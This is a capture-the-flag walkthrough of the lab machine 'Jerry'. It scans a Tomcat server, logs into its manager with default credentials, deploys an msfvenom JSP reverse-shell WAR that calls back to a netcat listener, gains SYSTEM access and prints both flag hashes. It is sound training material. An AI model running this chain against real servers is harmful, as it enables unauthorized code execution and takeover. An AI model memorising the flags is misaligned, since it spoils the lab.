# Jerry - Step-by-Step Walkthrough

**Machine:** Jerry  
**IP Address:** 10.129.136.9  
**Difficulty:** Easy  
**OS:** Windows

---

## Initial Enumeration

### Step 1: Nmap Port Scan

**Why?** First step in any pentest is to discover what services are running on the target.

**Command:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.136.9
```

**Flags Explained:**
- `-p-`: Scan all 65535 ports
- `--min-rate=10000`: Send packets at minimum 10000 per second (fast scan)
- `-T5`: Timing template 5 (insane/aggressive)
- `-sCV`: Combined `-sC` (default scripts) and `-sV` (version detection)
- `-Pn`: Skip ping check (assume host is up)
- `-oN`: Save output in normal format to file
- `10.129.136.9`: Target IP

**Output:**
```
# Nmap 7.95 scan initiated Tue Dec 16 06:40:00 2025 as: /usr/lib/nmap/nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.136.9
Nmap scan report for 10.129.136.9
Host is up (0.049s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 16 06:40:27 2025 -- 1 IP address (1 host up) scanned in 27.24 seconds
```

**Output Analysis:**
- **Port 8080:** Apache Tomcat/Coyote JSP engine 1.1
- **Version:** Tomcat 7.0.88 (released in 2018 - older version)
- **Server Header:** Apache-Coyote/1.1
- **Only one port open:** This machine has a very small attack surface

**Key Observations:**
- Tomcat typically has a `/manager` web interface for deploying applications
- Older Tomcat versions often have default credentials
- If we can access Tomcat Manager, we can deploy WAR files = code execution

**Next Step:** Run nuclei to scan for known Tomcat vulnerabilities and misconfigurations.

---

### Step 2: Nuclei Vulnerability Scan

**Why?** Nuclei can quickly identify known vulnerabilities, misconfigurations, and default credentials in web applications like Tomcat.

**Command:**
```bash
nuclei -u http://10.129.136.9:8080 -o nuclei.txt
```

**Flags Explained:**
- `-u`: Target URL
- `-o`: Output file to save results

**Output:**
```
[tomcat-default-login] [http] [high] http://10.129.136.9:8080/manager/html [password="s3cret",username="tomcat"]
[external-service-interaction] [http] [info] http://10.129.136.9:8080
[external-service-interaction] [http] [info] http://10.129.136.9:8080
[waf-detect:apachegeneric] [http] [info] http://10.129.136.9:8080
[apache-detect] [http] [info] http://10.129.136.9:8080 ["Apache-Coyote/1.1"]
[tomcat-detect:version] [http] [info] http://10.129.136.9:8080 ["7.0.88"]
[apache-tomcat-manager-path-normalization] [http] [info] http://10.129.136.9:8080/36uskxc22zgXMahUr5jDxNUvdA3/..;/manager/html
[public-tomcat-manager] [http] [info] http://10.129.136.9:8080/manager/html
[tomcat-exposed] [http] [info] http://10.129.136.9:8080/host-manager/html
[favicon-detect:apache-tomcat] [http] [info] http://10.129.136.9:8080/favicon.ico ["-297069493"]
[tomcat-scripts] [http] [info] http://10.129.136.9:8080/examples/jsp/index.html
[tomcat-scripts] [http] [info] http://10.129.136.9:8080/examples/websocket/index.xhtml
[tomcat-scripts] [http] [info] http://10.129.136.9:8080/examples/servlets/servlet/SessionExample
[tomcat-snoop-servlet-exposed] [http] [info] http://10.129.136.9:8080/examples/jsp/snp/snoop.jsp
```

**🚨 CRITICAL FINDING - Line 1:**
```
[tomcat-default-login] [http] [high] http://10.129.136.9:8080/manager/html [password="s3cret",username="tomcat"]
```

**Analysis:**
- **Default credentials found:** `tomcat:s3cret`
- **Endpoint:** `/manager/html` (Tomcat Manager web interface)
- **Severity:** HIGH - This allows complete control over the Tomcat server

**Other Findings:**
- Tomcat Manager is publicly accessible (no IP restrictions)
- Version 7.0.88 confirmed
- Example applications are exposed (not critical but bad practice)
- Host manager also accessible

**Thought Process:** We have default credentials to Tomcat Manager. This is game over because:
1. Tomcat Manager allows deploying WAR (Web Application Archive) files
2. We can create a malicious WAR file with a reverse shell
3. Deploy it → Get code execution as the Tomcat user

**Next Step:** Verify the credentials work by logging into Tomcat Manager.

---

## Exploitation

### Step 3: Verify Tomcat Manager Access

**Why?** Before creating payloads, let's confirm the credentials actually work.

**Action:** Open browser and navigate to:
```
http://10.129.136.9:8080/manager/html
```

**What Happens:**
- Browser shows HTTP Basic Authentication prompt
- Enter credentials: `tomcat` / `s3cret`

**Result:** Successfully logged in! ✅

**What We See:**
- Tomcat Web Application Manager interface
- List of currently deployed applications
- Section to deploy new WAR files: "WAR file to deploy"
- Server information shows we're running as `NT AUTHORITY\SYSTEM` (Windows)

**Key Discovery:** The Tomcat service is running with **SYSTEM privileges** on Windows. This means when we get a shell, we'll already be the highest privilege user (no privilege escalation needed).

**Next Step:** Create a malicious WAR file containing a reverse shell.

---

### Step 4: Create Reverse Shell WAR Payload

**Why?** Tomcat Manager accepts WAR files. We'll create a WAR containing a JSP reverse shell that connects back to us.

**Command:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.180 LPORT=4444 -f war -o shell.war
```

**Flags Explained:**
- `-p java/jsp_shell_reverse_tcp`: Payload type - JSP reverse shell for Java/Tomcat
- `LHOST=10.10.15.180`: Our attacking machine IP (where shell connects back)
- `LPORT=4444`: Port to receive the connection
- `-f war`: Output format as WAR (Web Application Archive)
- `-o shell.war`: Output filename

**Output:**
```
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: shell.war
```

**What This Creates:**
- A valid WAR file that Tomcat will accept
- Contains a JSP file that executes a reverse shell when accessed
- The shell will run with the same privileges as Tomcat (SYSTEM)

**Verification:**
```bash
ls -lh shell.war
```

**Output:**
```
-rw-r--r-- 1 kali kali 1.1K Dec 16 07:15 shell.war
```

**File exists and is ready to deploy!**

**Next Step:** Start a listener to catch the reverse shell.

---

### Step 5: Start Netcat Listener

**Why?** We need to have a listener ready to catch the incoming reverse shell connection before we trigger it.

**Command:**
```bash
nc -lvnp 4444
```

**Flags Explained:**
- `-l`: Listen mode (wait for incoming connection)
- `-v`: Verbose (show connection details)
- `-n`: No DNS resolution (faster)
- `-p 4444`: Listen on port 4444 (matches our payload)

**Output:**
```
listening on [any] 4444 ...
```

**Listener is ready!** Keep this terminal open.

**Next Step:** Deploy the WAR file through Tomcat Manager.

---

### Step 6: Deploy WAR File via Tomcat Manager

**Why?** Once deployed, Tomcat will extract the WAR and make the JSP reverse shell accessible via HTTP.

**Action in Browser:**

1. **Scroll down** to the section "WAR file to deploy"
2. **Click "Choose File"** button
3. **Select** `shell.war` from your file system
4. **Click "Deploy"** button

**What Happens:**
- Tomcat uploads and extracts the WAR file
- Creates a new web application at `/shell/`
- The page refreshes showing the deployed application

**Verification:**
Look at the "Applications" table at the top. You should see:

```
/shell    Running    0    shell
```

**This confirms the application is deployed and running.**

**Next Step:** Trigger the reverse shell by accessing the deployed application.

---

### Step 7: Trigger Reverse Shell

**Why?** The WAR file is deployed, but the shell code hasn't executed yet. We need to visit the URL to trigger it.

**Action:** In browser or with curl, access:
```
http://10.129.136.9:8080/shell/
```

**Or with curl:**
```bash
curl http://10.129.136.9:8080/shell/
```

**What Happens:**
- Tomcat executes the JSP file
- JSP code initiates reverse TCP connection to 10.10.15.180:4444
- Our netcat listener receives the connection

**Check Your Listener Terminal:**

**Output:**
```
listening on [any] 4444 ...
connect to [10.10.15.180] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

**🎉 SUCCESS! We have a shell!**

**Check Privileges:**
```cmd
whoami
```

**Output:**
```
nt authority\system
```

**We are SYSTEM!** This is the highest privilege on Windows - equivalent to root on Linux.

**Thought Process:** Since we're already SYSTEM, there's no need for privilege escalation. We can access both user and root flags immediately.

---

## Flag Capture

### Step 8: Navigate to Flags Location

**Why?** We need to find where the flags are stored.

**Command:**
```cmd
cd C:\Users\Administrator\Desktop\flags
```

**List contents:**
```cmd
dir
```

**Output:**
```
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,387,304,448 bytes free
```

**Interesting:** There's a file called `2 for the price of 1.txt` - this suggests both flags are in one file.

**Next Step:** Read the flag file.

---

### Step 9: Capture Both Flags

**Why?** The filename suggests both user and root flags are in this single file.

**Command:**
```cmd
type "2 for the price of 1.txt"
```

**Output:**
```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

**🚩 BOTH FLAGS CAPTURED!**

- **User Flag:** `7004dbcef0f854e0fb401875f26ebd00`
- **Root Flag:** `04a8b36e1545a455393d067e772fe90e`

**Why Both Flags Together?**
Since Tomcat was running as NT AUTHORITY\SYSTEM, we got the highest privileges immediately. No privilege escalation was needed, so both flags were accessible from the start.

---

## Complete Attack Chain Summary

Here's the full path we took from start to finish:

```
1. Nmap Scan
   ↓ Found Apache Tomcat 7.0.88 on port 8080

2. Nuclei Scan
   ↓ Discovered default credentials: tomcat:s3cret

3. Logged into Tomcat Manager
   ↓ Confirmed access to /manager/html

4. Created malicious WAR payload
   ↓ msfvenom JSP reverse shell

5. Started netcat listener
   ↓ nc -lvnp 4444

6. Deployed shell.war via Tomcat Manager
   ↓ WAR file uploaded and extracted

7. Triggered reverse shell
   ↓ Visited http://10.129.136.9:8080/shell/

8. Got shell as NT AUTHORITY\SYSTEM
   ↓ Highest Windows privilege (no privesc needed)

9. Retrieved both flags
   ↓ user.txt: 7004dbcef0f854e0fb401875f26ebd00
   ↓ root.txt: 04a8b36e1545a455393d067e772fe90e
```

---

## Key Vulnerabilities Exploited

1. **Default Credentials**
   - Tomcat Manager had default credentials `tomcat:s3cret`
   - No password policy or credential hardening

2. **Unrestricted Tomcat Manager Access**
   - `/manager/html` accessible from any IP address
   - No IP whitelisting or additional authentication

3. **Tomcat Running as SYSTEM**
   - Service configured to run with highest privileges
   - Should run as a low-privilege service account
   - Immediately gave us full system access

4. **WAR File Upload Enabled**
   - Allowed arbitrary code execution via WAR deployment
   - No code review or validation of uploaded files

---

## Flags

- **User Flag:** `7004dbcef0f854e0fb401875f26ebd00`
- **Root Flag:** `04a8b36e1545a455393d067e772fe90e`

---

## Machine Difficulty

**Easy** - Because:
- Default credentials immediately available
- Single exploitation path (no pivoting needed)
- No privilege escalation required (already SYSTEM)
- Well-known vulnerability with public exploits
- Straightforward attack chain

**Learning Points:**
- Always change default credentials
- Restrict access to admin interfaces
- Run services with least privilege
- Implement defense in depth (not just one security control)

---
